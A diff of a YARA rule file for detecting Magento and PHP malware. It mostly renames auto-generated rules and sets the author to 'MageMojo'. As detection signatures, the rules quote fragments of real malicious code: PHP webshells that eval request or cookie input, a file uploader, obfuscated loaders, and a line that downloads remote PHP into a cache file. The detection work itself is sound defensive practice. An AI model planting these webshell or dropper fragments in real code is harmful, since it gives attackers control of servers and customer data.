@@ -2,6 +2,7 @@ import "hash"
 rule Magento_shoplift_hack3
 {
 		meta:
+		author = "MageMojo"
 			description = "finds magecard hack for Magento"
 		strings:
 			$s1 = "magecard.xyz"
@@ -12,7 +13,7 @@ rule Magento_shoplift_hack3
 rule Magento_shoplift_hack2
 {
 		meta:
-			author = "martys"
+		author = "MageMojo"
 			description = "locates suspicious function usually in app/code/core/Mage/Cms/controllers/IndexController.php"
 		strings:
 			$hack = "Mage_Cms_Auth_"
@@ -22,6 +23,8 @@ rule Magento_shoplift_hack2
 }
 rule PHP_malware_svchost
 {
+meta:
+		author = "MageMojo"
 	strings:
 		$s0 = "svchost.exe" fullword ascii
 	condition:
@@ -31,7 +34,7 @@ rule PHP_malware_svchost
 rule Magento_soulmagic_cchack
 {
 	meta:
-			author = "martys"
+		author = "MageMojo"
 			description = "soulmagic cc.php hacks"
 	strings:
 		$url="soulmagic.biz"
@@ -45,6 +48,7 @@ rule Magento_soulmagic_cchack
 rule Perl_conspy_hack
 {
 		meta:
+		author = "MageMojo"
 		description="perl script that grabs conf files and other data to find exploits"
 		strings:
 			$1="copral"
@@ -59,7 +63,7 @@ rule Perl_conspy_hack
 rule Magento_shoplift_hack
 {
 		meta:
-			author = "martys"
+		author = "MageMojo"
 			description = "possible customer login registration hack"
 		strings:
 			$1="Mag Log1n"
@@ -70,7 +74,7 @@ rule Magento_shoplift_hack
 rule Malware_host_ddos
 {
 			meta:
-			author = "martys"
+		author = "MageMojo"
 			description = "ddos using /usr/bin/host"
 			strings:
 			$1="/usr/bin/host"
@@ -81,7 +85,7 @@ rule Malware_host_ddos
 rule PHP_backdoor10
 {
 		meta:
-			author = "martys"
+		author = "MageMojo"
 			description = "backdoor file editor?"
 		strings:
 			$1="L2hvbWUveXVtaS9wdWJsaWNfaHRtbC9tZWRpYS9jYXRhbG9nL3Byb2R1Y3QvYi84L2I4YTRmNmQyLWY0OWQtNDA5OC04OTFjLWQ3NDNiOTQyZmVlMy5qcGc="
@@ -92,6 +96,8 @@ rule PHP_backdoor10
 }
 rule PHP_backdoor7
 {
+meta:
+		author = "MageMojo"
 		strings:
                          $1="function p($bkdbrqyvb, $ylzhxco){$lqqqqudl"
 		condition:
@@ -101,7 +107,7 @@ rule PHP_backdoor7
 rule PHP_backdoor6
 {
 		meta:
-			author = "martys"
+		author = "MageMojo"
 			description ="some garbage code"
 		strings:
 			$1 = "x69x66x28x21x66x75x6ex63x74x69x6fx6ex5fx65x78x69x73x74x73x28x22xa0x22x29x29x7bx66x75x6ex63x74x69x6fx6ex20xa0x28x29x7bx24xa0x3dx73x74x72x5fx72x65x70x6cx61x63x65x28x61x72x72x61x79x28x27x23x73x21x73x23x27x2cx27x23x65x21x65x23x27x2cx27x23x30x21x30x23x27x29x2cx61x72x72x61x79x28x27x3cx27x2cx27x3ex27x2cx22x5cx30x22x29x2cx6fx62x5fx67x65x74x5fx63x6cx65x61x6ex28x29x29x3bx66x6fx72x28x24xa0xa0x3dx31x2cx24xa0xa0xa0x3dx6fx72x64x28x24xa0x5bx30x5dx29x3bx24xa0xa0x3cx73x74x72x6cx65x6ex28x24xa0x29x3bx24xa0xa0x2bx2bx29x24xa0x5bx24xa0xa0x5dx3dx63x68x72x28x6fx72x64x28x24xa0x5bx24xa0xa0x5dx29x2dx24xa0xa0xa0x2dx24xa0xa0x29x3bx24xa0x5bx30x5dx3dx27x20x27x3bx72x65x74x75x72x6ex20x24xa0x3bx7dx7d" ascii
@@ -112,7 +118,7 @@ rule PHP_backdoor6
 rule PHP_backdoor5
 {
 		meta:
-			author = "martys"
+		author = "MageMojo"
 			description ="some garbage code from list.php"
 		strings:
 			$1 = "$xuew = Array("
@@ -124,7 +130,7 @@ rule PHP_backdoor5
 rule Magento_onepage_php_hack2
 {
 		meta:
-			author = "martys"
+		author = "MageMojo"
 			description = "gzinflate junk in Onepage.php"
 		strings:
 			$1 = "=8k/9WnepdriVNcWD8UydY2Y2TWzq1KDWNm6Qj2SUMefJHh3ps4SVoU/HoAHF+ZYkak/isGyl/ndcG7ZRAgHgsl2zXD3nCfySH5iGPzIYJGeCf7vxVfIElR1eivIx8Yzm3I+A8rgoq1M9nV9+wzKB1r+7xXi2nTaxtlcZ/j5MtTGLpmep1fU9EZ626oNnJi5xEI0ksi03i8qgAp9SedXj9sOmDYC9dgrC/2ZL4PF4iGglOSRyF4wpo+ygMeBYWUow8ZjTOIVMPGXtpvJD5dnHwHYY54PK4nTCyPFCq2HmWjq+8cbqUClxcxyTakEUTod5a4EiUHYNrBauNqW5Whes8gnUEENvTFIdYWtAkv4wpYtx9Hs0QT8xs/BuG7s9WuL8G8QghUJ0QTjlLWzzvkrpvcKlBDl07WiXU2vpGJ66WqTf2UxUAYCHwCncC6UAGPue2oQY4LDVTdFmsfJQRlTFuMFvLl+ao7FUuiLOOuMS4TiHfeZrPhgYcIMpL1Y2XRsndiYdcMeNSEsDSo0WtCXSSbBYIQPxAy+RysQHghyKEacufCIBnUdLcnAuJqI50g1NzDE5ZneqD9p0DSnpCXKyk76uiZEuM2A1HdUd1cfJ9x+nf/GdazAGJzieOMdP99tIbHPPfD3Pps2MQJte8SjY8jgHWm4SfeOZxSQPziPbZ8UXMLB/+Vab5SltgPFspKsAZF1ODOhZtC4wgHZEsafojXAbAgrMyPZKv0QOf0DiL2Mmjc+QmFwRhWzPbi733sIvSD3grafLyN7nufxsbzNN2JIoNLyEDu+DdzQYgTIPS7Kz0URNcgoooIa"
@@ -136,7 +142,7 @@ rule Magento_onepage_php_hack2
 rule Potential_Malware_gzinflates
 {
 		meta:
-			author = "martys"
+		author = "MageMojo"
 			description = "gzinflate junk in Onepage.php"
 		strings:
 			$2 = "eval(gzinflate(base64_decode(str_rot13(strrev("
@@ -147,7 +153,7 @@ rule Potential_Malware_gzinflates
 rule Magento_onepage_php_hack
 {
 			meta:
-			author = "martys"
+		author = "MageMojo"
 			description = "gzinflate junk in Onepage.php"
 			strings:
 				$1 = "if(md5(@$_COOKIE["
@@ -157,6 +163,8 @@ rule Magento_onepage_php_hack
 }
 rule PHP_backdoor4
 {
+meta:
+		author = "MageMojo"
 		strings:
 			$1="$s98b0504="
 		condition:
@@ -165,6 +173,8 @@ rule PHP_backdoor4
 }
 rule PHP_backdoor3
 {
+meta:
+		author = "MageMojo"
     strings:
         $ = "chk_jschl"
         $ = "jschl_vc"
@@ -175,6 +185,8 @@ rule PHP_backdoor3
 }
 rule Potential_Malware_Bad_Websites
 {
+meta:
+		author = "MageMojo"
     strings:
         $ = "1337day.com"
         $ = "altervista.org"
@@ -197,26 +209,22 @@ rule Potential_Malware_Bad_Websites
         any of them
 
 }
-rule YarGen_php_backdoor22
+rule php_backdoor22
 {
 	meta:
+		author = "MageMojo"
 		description = "Auto-generated rule - file _install.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2015-12-23"
 		hash = "05992110a3eec5a7af08f5db280be65d9aa3d96e3633777bb91bf42f9d5394e7"
 	strings:
 		$s0 = "$YiunIUY76bBhuhNYIO9 = \"ZXZhbChldmFsKCJceDcyXHg2NVx4NzRceDc1XHg3Mlx4NmVceDIwXHg3M1x4NzRceDcyXHg3Mlx4NjVceDc2XHgyOFx4NjJceDYxXHg" ascii
 	condition:
 		uint16(0) == 0x3f3c and filesize < 139KB and all of them
 }
-rule YarGen_php_backdoor21
+rule php_backdoor21
 {
 	meta:
+		author = "MageMojo"
 		description = "Auto-generated rule - file skins.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2015-12-23"
 		hash = "501d9df6c214133bf43e691ba2b70b397307861bb468a14e058784bef5b75d65"
 	strings:
 		$s0 = "<?php if(@$_COOKIE[qz]) ($_=@$_REQUEST[q]).@$_($_REQUEST[z]); ?>" fullword ascii
@@ -224,13 +232,11 @@ rule YarGen_php_backdoor21
 		uint16(0) == 0x3f3c and filesize < 1KB and all of them
 
 }
-rule YarGen_php_backdoor20
+rule php_backdoor20
 {
 	meta:
+		author = "MageMojo"
 		description = "Auto-generated rule - file shrr.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2015-12-23"
 		hash = "5e8a1ddde920418879aa3776cba8dff2e30acc0484d22ce35ce18b619cd9888c"
 	strings:
 		$s0 = "ttytty(477);wsoSecParam(ttytty(478),wsoEx(ttytty(479)));wsoSecParam(ttytty(480),@file_get_contents(ttytty(481)));echo /*  */" fullword ascii
@@ -257,26 +263,21 @@ rule YarGen_php_backdoor20
 	condition:
 		uint16(0) == 0x3f3c and filesize < 426KB and all of them
 }
-rule YarGen_php_backdoor19
+rule php_backdoor19
 {
 	meta:
+		author = "MageMojo"
 		description = "Auto-generated rule - file favicon.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2015-12-23"
 		hash = "8f7e8d2b705c875a5e043909c8192c8afc0a4b3d4f83008c3e28f7d353322345"
 	strings:
 		$s0 = "$idc = \"=Ew/P7//fvf/e20P17/LpI7L34PwCabTrwvXJbPWN3TV+/T/mE3R5//n3zfJlHOEt/33HXCPomvNr8X9Of74N/C8u0KblTAt8+AAh3gjnKzeZWDyELiXuc/" ascii
 	condition:
 		uint16(0) == 0x3f3c and filesize < 75KB and all of them
 }
-rule YarGen_paypal_phish2
+rule paypal_phish2
 {
 	meta:
-		description = "Auto-generated rule - file ipays.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2015-12-23"
+		author = "MageMojo"
 		hash = "b3a969bdb74a62a96d4c3ca35733fd21ad6274f6bbf07398189a9203bf634b73"
 	strings:
 		$s0 = "else {$tmp = htmlspecialchars(\"./dump_\".getenv(\"SERVER_NAME\").\"_\".$sql_db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\");}" fullword ascii
@@ -303,13 +304,11 @@ rule YarGen_paypal_phish2
 	condition:
 		uint16(0) == 0x3f3c and filesize < 587KB and all of them
 }
-rule YarGen_php_backdoor18
+rule php_backdoor18
 {
 	meta:
+		author = "MageMojo"
 		description = "Auto-generated rule - file ajax17.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2015-12-23"
 		hash = "e5c2991d5876872d36719b476e2506d32a4b1ae2f6e72b227fd4186e99a970e4"
 	strings:
 		$s0 = "@$GLOBALS[$GLOBALS['l58848089'][68].$GLOBALS['l58848089'][24].$GLOBALS['l58848089'][7].$GLOBALS['l58848089'][22]](0);" fullword ascii
@@ -332,13 +331,11 @@ rule YarGen_php_backdoor18
 	condition:
 		uint16(0) == 0x3f3c and filesize < 42KB and all of them
 }
-rule YarGen_php_backdoor17
+rule php_backdoor17
 {
 	meta:
+		author = "MageMojo"
 		description = "Auto-generated rule - file lib.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2015-12-23"
 		hash = "e398270203deab8f6dc1d4a3b6766113f567bc93ef46e105c3e71eafac3ab0d5"
 	strings:
 		$s0 = "<?php                                                                           " fullword ascii
@@ -346,39 +343,33 @@ rule YarGen_php_backdoor17
 	condition:
 		uint16(0) == 0x3f3c and filesize < 189KB and all of them
 }
-rule YarGen_php_backdoor16
+rule php_backdoor16
 {
 	meta:
+		author = "MageMojo"
 		description = "Auto-generated rule - file session.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2015-12-23"
 		hash = "ba688769b6ba37ddc7b2f23d662c5d970de331c2b3cf421d2d92a6033c21f115"
 	strings:
 		$s0 = "$i45=\"gGatAE\\tf Z{V)x+L9eb&>ohmdz%RBn4N@\\rlFj1.ys#W*J[v86CMX}?'D2q]S7IUki0=Q(<O/u_w,r~-`p\\n5\\$\\\\K3;T!H^Y|:\\\"cP\"; $GLOB" ascii
 	condition:
 		uint16(0) == 0x3f3c and filesize < 188KB and all of them
 }
-rule YarGen_php_backdoor15
+rule frontend_php
 {
 	meta:
+		author = "MageMojo"
 		description = "Auto-generated rule - file frontend.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2015-12-23"
 		hash = "e5b7ff2839fee50529aa7f1901afa09f5e8eeaa1efe8780178c16b824ade1e62"
 	strings:
 		$s0 = "kr';$___=isset($_POST['___'])?$_POST['___']:(isset($_COOKIE['___'])?$_COOKIE['___']:NULL);if($___!==NULL){$___=md5($___).substr(" ascii
 	condition:
 		uint16(0) == 0x3f3c and filesize < 46KB and all of them
 }
-rule YarGen_php_backdoor14
+rule xmlrpc_php
 {
 	meta:
+		author = "MageMojo"
 		description = "Auto-generated rule - file xmlrpc.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2015-12-23"
 		hash = "b1ae51cd5110453630f0fd14b08dfa17408f967ca340c91706c9d3fad8adc507"
 	strings:
 		$s0 = "$code = \"7b3peuO4sQD6P9+Xd2AzzrQ9lkVJlve2Z7Tasq3d8tbd16FESqK1UCapNafvs98qACTBRYs9PTnJuZlkxiKWQgEoFAqFQtVvF19+G3VHf/2L9Ovm/0hYXP" ascii
@@ -389,52 +380,44 @@ rule YarGen_php_backdoor14
 	condition:
 		uint16(0) == 0x3f3c and filesize < 183KB and all of them
 }
-rule YarGen_php_backdoor13
+rule options_php
 {
 	meta:
+		author = "MageMojo"
 		description = "Auto-generated rule - file options.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2015-12-23"
 		hash = "4bfc9610a3ba49a2ed79e0952d0221fe2b7c013f57787efc9801d4ea4c9ab8c5"
 	strings:
 		$s0 = "<?php $cookey = \"a4eb8c7f1c\"; preg_replace(\"\\x23\\50\\x2e\\53\\x29\\43\\x69\\145\",\"\\x40\\145\\x76\\141\\x6c\\50\\x22\\134" ascii
 	condition:
 		uint16(0) == 0x3f3c and filesize < 2KB and all of them
 }
-rule YarGen_php_backdoor12
+rule unint_php
 {
 	meta:
+		author = "MageMojo"
 		description = "Auto-generated rule - file unint.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2015-12-23"
 		hash = "42a4ca6aac30a2cefd5507ddd22c4ef8af85106a61ea3cb25e248e3e55db4b56"
 	strings:
 		$s0 = "if(isset($_POST['shauid'])){ $uidmail = base64_decode($_POST['shauid']); eval($uidmail); }" fullword ascii
 	condition:
 		uint16(0) == 0x3f3c and filesize < 1KB and all of them
 }
-rule YarGen_php_backdoor10
+rule ea_php
 {
 	meta:
+		author = "MageMojo"
 		description = "Auto-generated rule - file ea.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2015-12-23"
 		hash = "b1a3ef7be8a6773e60d0b934ba9b13cadaf2a01810f93c85b483f966d06a63c6"
 	strings:
 		$s0 = "<?php ${\"\\x47\\x4c\\x4f\\x42A\\x4c\\x53\"}[\"\\x6b\\x64\\x71\\x79\\x65e\"]=\"\\x76\\x61lue\";${\"\\x47\\x4c\\x4f\\x42\\x41L\\x" ascii
 	condition:
 		uint16(0) == 0x3f3c and filesize < 13KB and all of them
 }
-rule YarGen_php_backdoor9
+rule php_backdoor9
 {
 	meta:
+		author = "MageMojo"
 		description = "Auto-generated rule - file test.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2015-12-23"
 		hash = "e374927579a0c832aa6b865796112dbd618d879bd9e8003ab65c33cb917957e4"
 	strings:
 		$s0 = "error_reporting(E_ALL); ?>" fullword ascii
@@ -443,13 +426,11 @@ rule YarGen_php_backdoor9
 		uint16(0) == 0x3f3c and filesize < 1KB and all of them
 
 }
-rule YarGen_php_backdoor8
+rule php_backdoor8
 {
 	meta:
+		author = "MageMojo"
 		description = "Auto-generated rule - file install.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2015-12-23"
 		hash = "c020f43c76c8953d08cc2160e94c764c45dc4d42c4583ff7bfebb2440b626e40"
 	strings:
 		$s0 = "<?php eval(stripslashes($_REQUEST[q]));?>" fullword ascii
@@ -457,26 +438,22 @@ rule YarGen_php_backdoor8
 		uint16(0) == 0x3f3c and filesize < 1KB and all of them
 
 }
-rule YarGen_php_backdoor7
+rule php_backdoor202
 {
 	meta:
+		author = "MageMojo"
 		description = "Auto-generated rule - file 202.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2015-12-23"
 		hash = "137ec03babf8fad6f19e0eb5bba0a27a3c40f3ba7b0dd32abf8c54400d29cc61"
 	strings:
 		$s0 = "<form enctype=\"multipart/form-data\" action=\"\" method=\"POST\">Message : <input size=\"20\" name=\"uploadedfile\" type=\"file" ascii
 	condition:
 		uint16(0) == 0x663c and filesize < 1KB and all of them
 }
-rule YarGen_php_backdoor6
+rule info_php
 {
 	meta:
+		author = "MageMojo"
 		description = "Auto-generated rule - file info.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2015-12-23"
 		hash = "1c66d79e8f02047f0cf3afd213a7b23fa3ab531d10899b7e3674a3f27e1b6c0e"
 	strings:
 		$s0 = "lHD/IJ0Oceapol0Lwh7fwpnXaA2qqhojfZwZr4kGTB/crGTUBEFtpYGXgJtqoRtujbz+tZx0YG9e6QgL" fullword ascii
@@ -504,13 +481,11 @@ rule YarGen_php_backdoor6
 		uint16(0) == 0x3f3c and filesize < 62KB and all of them
 
 }
-rule YarGen_paypal_phish
+rule paypal_phish
 {
 	meta:
+		author = "MageMojo"
 		description = "Auto-generated rule - from files ipays.php, ipays.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2015-12-23"
 		super_rule = 1
 		hash1 = "b3a969bdb74a62a96d4c3ca35733fd21ad6274f6bbf07398189a9203bf634b73"
 		hash2 = "b3a969bdb74a62a96d4c3ca35733fd21ad6274f6bbf07398189a9203bf634b73"
@@ -539,13 +514,11 @@ rule YarGen_paypal_phish
 	condition:
 		uint16(0) == 0x3f3c and filesize < 587KB and all of them
 }
-rule YarGen_php_backdoor5
+rule phpini_backdoor
 {
 	meta:
+		author = "MageMojo"
 		description = "Auto-generated rule - from files shrr.php, phpini.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2015-12-23"
 		super_rule = 1
 		hash1 = "5e8a1ddde920418879aa3776cba8dff2e30acc0484d22ce35ce18b619cd9888c"
 		hash2 = "3fe9214b33ead5c7d1f80af469593638b9e1e5f5730a7d3ba2f96b6b555514d4"
@@ -574,13 +547,11 @@ rule YarGen_php_backdoor5
 	condition:
 		uint16(0) == 0x3f3c and filesize < 426KB and all of them
 }
-rule YarGen_php_backdoor4
+rule php_backdoor40
 {
 	meta:
+		author = "MageMojo"
 		description = "php_malware - file 000024.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2015-12-30"
 		hash = "6e304a0ae94f910a73a7b4e67623e9e40832abae692c0dc145231cd1cdbdcfb1"
 	strings:
 		$s0 = "<?php error_reporting(0); assert(stripslashes($_REQUEST[btql])); error_reporting(E_ALL); ?>" fullword ascii
@@ -588,26 +559,22 @@ rule YarGen_php_backdoor4
 		uint16(0) == 0x3f3c and filesize < 1KB and all of them
 
 }
-rule YarGen_php_backdoor3
+rule php_backdoor33
 {
 	meta:
+		author = "MageMojo"
 		description = "php_malware - file 000009.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2015-12-30"
 		hash = "b9faa9b4e3d0fc9ab2707001339a5094d202521fa66a357c4428fd5c8e34755c"
 	strings:
 		$s0 = "<?php $hash = '233b8273337bdb0090abe8eef3375b6c'; if(isset($_POST[ue])){if (md5($_POST['hash']) === $hash) @eval(base64_decode($" ascii
 	condition:
 		uint16(0) == 0x3f3c and filesize < 1KB and all of them
 }
-rule YarGen_php_backdoor2
+rule php_backdoor34
 {
 	meta:
+		author = "MageMojo"
 		description = "php_malware - file 000026.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2015-12-30"
 		hash = "c5d71ae59cf9a520833080bcfacaeeb4db6f941e201af05338f93bd9e45042d6"
 	strings:
 		$s0 = "<?PHP /*** Magento** NOTICE OF LICENSE** This source file is subject to the Open Software License (OSL 3.0)* that is bundled wit" ascii
@@ -615,39 +582,33 @@ rule YarGen_php_backdoor2
 		uint16(0) == 0x3f3c and filesize < 6KB and all of them
 
 }
-rule YarGen_php_backdoor1
+rule php_backdoor35
 {
 	meta:
+		author = "MageMojo"
 		description = "php_malware - file updates.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2016-01-01"
 		hash = "bedf7c629281b7c517bb00d3c5b633d6f830bfdba8bd18fb931e692ddad1a110"
 	strings:
 		$s0 = "preg_replace(\"/.*/e\",\"\\x65\\x76\\x61\\x6C\\x28\\x67\\x7A\\x69\\x6E\\x66\\x6C\\x61\\x74\\x65\\x28\\x62\\x61\\x73\\x65\\x36\\x" ascii
 	condition:
 		uint16(0) == 0x3f3c and filesize < 139KB and all of them
 }
-rule YarGen_info_php_backdoor
+rule info_php_backdoor
 {
 	meta:
+		author = "MageMojo"
 		description = "php_malware - file info.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2016-01-07"
 		hash = "2f9f545b4f52fea20c656040a65cb4152ddb7319f3ef566574e977e84d60b825"
 	strings:
 		$s0 = "<?php if(isset($_POST[ue])){@eval(base64_decode($_POST[ue]));exit;}if(isset($_GET[sesion])){phpinfo();} ?>" fullword ascii
 	condition:
 		uint16(0) == 0x3f3c and filesize < 1KB and all of them
 }
-rule YarGen_error_php_backdoor
+rule error_php_backdoor
 {
 	meta:
+		author = "MageMojo"
 		description = "php_malware - file error.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2016-01-07"
 		hash = "52e2de452d396092f9f4442157eafe5c71b2227f7a554d079bdda00f110ae7e5"
 	strings:
 		$s0 = "$string361369589 = \"sys2iGpM4W6AelyNEX0NodYcjLTe9cnzBXiUpF5VcMqM5YCANk3kKntbnch5g60k0zoAG59cX9tBctNoAj1kA1FVBmebRIWnEx4D59n+GrB" ascii
@@ -674,52 +635,45 @@ rule YarGen_error_php_backdoor
 	condition:
 		uint16(0) == 0x3f3c and filesize < 266KB and all of them
 }
-rule YarGen_sohai_backdoor
+rule sohai_backdoor
 {
 	meta:
+		author = "MageMojo"
 		description = "php_malware - file index.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2016-01-01"
 		hash = "ffa0ade30bd3f792fd390c52934844b2676961f50a4e963f2743200a017d6248"
 	strings:
 		$s0 = "<?php /* Encoder by sohai obfuscation V1.3*/ $ioOAiSoiihISSSAAooOA=file(__FILE__);eval(base64_decode(\"aWYoIWZ1bmN0aW9uX2V4aXN0c" ascii
 	condition:
 		uint16(0) == 0x3f3c and filesize < 307KB and all of them
 }
-rule YarGen_header
+rule header_bad_js
 {
 	meta:
+		author = "MageMojo"
 		description = "php_malware - file header.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2016-01-18"
+
 		hash = "7c750bd9b1bcb152aabb8aec4b2486bfb6a34f643deed2b4501ce353537c8a7e"
 	strings:
 		$s0 = "<script type=\"text/javascript\">var a=\"'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlg" ascii
 	condition:
 		uint16(0) == 0x733c and filesize < 3KB and all of them
 }
-rule YarGen_Main
+rule Main_php
 {
 	meta:
+		author = "MageMojo"
 		description = "php_malware - file Main.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2016-01-18"
 		hash = "53f656fb4fe3b8580e23aa32db98ceef0c141f4cdb578328a456cfca201bdba2"
 	strings:
 		$s0 = "<?php eval(base64_decode(\"JGlwPSRfU0VSVkVSWyJSRU1PVEVfQUREUiJdOyRkcj0kX1NFUlZFUlsiRE9DVU1FTlRfUk9PVCJdOyR1YSA9ICRfU0VSVkVSWydIV" ascii
 	condition:
 		uint16(0) == 0x3f3c and filesize < 12KB and all of them
 }
-rule YarGen_grizzly_massemail
+rule grizzly_massemail
 {
 	meta:
+		author = "MageMojo"
 		description = "php_malware - file grizzly_massemail.html"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2016-01-18"
 		hash = "550e21b70e7c5136a145a92e3469d5470c1b2c1a0870bbb749d7a9853901183d"
 	strings:
 		$s0 = "DropFileName = \"svchost.exe\"" fullword ascii
@@ -737,13 +691,11 @@ rule YarGen_grizzly_massemail
 	condition:
 		uint16(0) == 0x2f3c and filesize < 608KB and all of them
 }
-rule YarGen_index3
+rule index3_php
 {
 	meta:
+		author = "MageMojo"
 		description = "php_malware - file index.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2016-01-18"
 		hash = "f695f725cec1ad8d1a7e7e114472597d5c721b07bed2570117d09da40ca75bfa"
 	strings:
 		$s0 = "if (isset($_GET[$_config['url_var_name']], $_POST[$_config['basic_auth_var_name']], $_POST['username'], $_POST['password']))" fullword ascii
@@ -770,13 +722,11 @@ rule YarGen_index3
 	condition:
 		uint16(0) == 0x3f3c and filesize < 117KB and all of them
 }
-rule YarGen_project_wonderful
+rule project_wonderful
 {
 	meta:
+		author = "MageMojo"
 		description = "php_malware - file mod_project_wonderful.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2016-01-18"
 		hash = "b41161aacc7eac40d28f8e87892c5c4d0b0a995c9508e8f9268e141881b7e76a"
 	strings:
 		$s0 = "';$___=isset($_POST['___'])?$_POST['___']:(isset($_COOKIE['___'])?$_COOKIE['___']:NULL);if($___!==NULL){$___=md5($___).substr(md" ascii
@@ -784,13 +734,11 @@ rule YarGen_project_wonderful
 	condition:
 		uint16(0) == 0x3f3c and filesize < 46KB and all of them
 }
-rule YarGen_shell_hack
+rule shell_hack
 {
 	meta:
+		author = "MageMojo"
 		description = "php_malware - file order_reminder.html"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2016-01-18"
 		hash = "9bd35a97746f2e5fdeba5d7ee3353de787bb5bf8a4f5308a9c5b8b88fb469442"
 	strings:
 		$s0 = "DropFileName = \"svchost.exe\"" fullword ascii
@@ -808,39 +756,33 @@ rule YarGen_shell_hack
 	condition:
 		uint16(0) == 0x2f3c and filesize < 608KB and all of them
 }
-rule YarGen_test1_php_backdoor
+rule test1_php_backdoor
 {
 	meta:
+		author = "MageMojo"
 		description = "php_malware - file test1.php2"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2016-01-18"
 		hash = "c6987684488275d3a1b8e702a699ea13ef07c5f86e1e910da37b5e919e935097"
 	strings:
 		$s0 = "<?PHP if(isset($_GET['do'])){$t0=$q1=null;$t2=array('./adminhtml/default/default/images');$r3=array('_bg','_sm','_icon','_left'," ascii
 	condition:
 		uint16(0) == 0x3f3c and filesize < 14KB and all of them
 }
-rule YarGen_adbru
+rule php_backdoor36
 {
 	meta:
+		author = "MageMojo"
 		description = "php_malware - file 123.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2016-01-18"
 		hash = "bd887c5b20de988c6ebef82a1be7a976fe4d244c7db9a1423b10e7bedf7bd922"
 	strings:
 		$s0 = "<?php $cmd1 = file_get_contents(\"http://lnx.adb.ru/1.txt\"); $fo = fopen(\"cache1.php\", \"w+\"); fwrite($fo, $cmd1); fclose($f" ascii
 	condition:
 		uint16(0) == 0x3f3c and filesize < 1KB and all of them
 }
-rule YarGen_pjs
+rule pjs_bad_js
 {
 	meta:
+		author = "MageMojo"
 		description = "php_malware - file pjs.js"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2016-01-18"
 		hash = "f3f9d9a5a78f606dbe3bc275c75576a0bfe37fd057df942b0f4eb68e5e79bec2"
 	strings:
 		$s0 = "function New_Wind0w() {document.PHProxy.target = (document.PHProxy.target == '_blank') ? '_top' : '_blank';}" fullword ascii
@@ -867,26 +809,22 @@ rule YarGen_pjs
 	condition:
 		uint16(0) == 0xbbef and filesize < 7KB and all of them
 }
-rule YarGen_503
+rule backdoor_503
 {
 	meta:
+		author = "MageMojo"
 		description = "php_malware - file 503.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2016-01-18"
 		hash = "f235f590b13081ca7042d96e31430508308452d062c60cd10345b3e5fcafcb8d"
 	strings:
 		$s0 = "error_reporting(0);$f=$_FILES[xsdsdss];copy($f[tmp_name],$f[name]);error_reporting(E_ALL); " fullword ascii
 	condition:
 		uint16(0) == 0x7265 and filesize < 1KB and all of them
 }
-rule YarGen_index_packaged2
+rule index_packaged2
 {
 	meta:
+		author = "MageMojo"
 		description = "php_malware - file index_packaged2.js"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2016-01-18"
 		hash = "75f7e1558d02d339b5848ba0294ce809157ce41974af9169fec111616124302f"
 	strings:
 		$s0 = "a+\">\").appendTo(\"body\"),d=b.css(\"display\");b.remove();if(d===\"none\"||d===\"\")d=\"block\";ea[a]=d}return ea[a]}function " ascii
@@ -913,13 +851,11 @@ rule YarGen_index_packaged2
 	condition:
 		uint16(0) == 0x6628 and filesize < 712KB and all of them
 }
-rule YarGen_index_packaged
+rule index_packaged
 {
 	meta:
+		author = "MageMojo"
 		description = "php_malware - file index_packaged.js"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2016-01-18"
 		hash = "ab9ed9628492a7b02c86d90cb873aa66c85e79b9bb569e9cf0530616222cf772"
 	strings:
 		$s0 = "a+\">\").appendTo(\"body\"),d=b.css(\"display\");b.remove();if(d===\"none\"||d===\"\")d=\"block\";ea[a]=d}return ea[a]}function " ascii
@@ -946,39 +882,33 @@ rule YarGen_index_packaged
 	condition:
 		uint16(0) == 0x6628 and filesize < 726KB and all of them
 }
-rule YarGen_backdoor
+rule php_backdoor37
 {
 	meta:
+		author = "MageMojo"
 		description = "php_malware - file backdoor.php"
-		author = "YarGen Rule Generator"
-		reference = "not set"
-		date = "2016-01-18"
